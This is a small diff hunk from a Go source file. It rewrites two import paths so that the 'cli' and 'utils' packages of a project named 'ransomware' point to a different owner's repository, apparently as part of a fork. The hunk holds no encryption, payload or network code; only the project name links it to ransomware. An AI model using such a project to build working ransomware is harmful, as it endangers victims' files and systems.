@@ -6,8 +6,8 @@ import (
 	"time"
 
 	"github.com/common-nighthawk/go-figure"
-	"github.com/marmos91/ransomware/cli"
-	"github.com/marmos91/ransomware/utils"
+	"github.com/fblock-nvidia/ransomware/cli"
+	"github.com/fblock-nvidia/ransomware/utils"
 	urfavecli "github.com/urfave/cli/v2"
 )
 
